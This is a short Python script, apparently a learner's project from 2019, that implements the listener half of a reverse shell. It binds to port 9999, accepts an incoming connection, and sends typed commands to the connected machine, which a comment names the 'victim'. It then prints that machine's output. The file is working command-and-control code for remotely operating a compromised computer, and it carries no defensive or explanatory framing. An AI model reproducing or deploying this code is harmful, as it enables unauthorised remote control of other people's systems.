# -*- coding: utf-8 -*-
"""
Created on Tue May  7 15:24:13 2019

@author: nahid
"""
import socket
import sys

##create socket : connect two pcs
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
        
    except socket.error as msg:
        print("Error creating socket: " + str(msg))
        

##binding for socket and listning for connection
def bind_socket():
    try:
        global host
        global port
        global s
        
        print("Binding the port: " +str(port))
        
        s.bind((host,port))
        s.listen(5) #number of time for listening
        
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        bind_socket()
        

##Establish connection with client (socket must be listening)
def socket_accept():
   conn,address = s.accept() #conn is a object of a connection and address is the list of ips
   print("Connection has been established! |"+" IP: "+address[0]+"| Port: "+str(address[1])) #print ip and port
   send_command(conn)
   conn.close()
 
## send command to vicctim    
def send_command(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd))>0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")
            
def main():
    create_socket()
    bind_socket()
    socket_accept()
    
main()  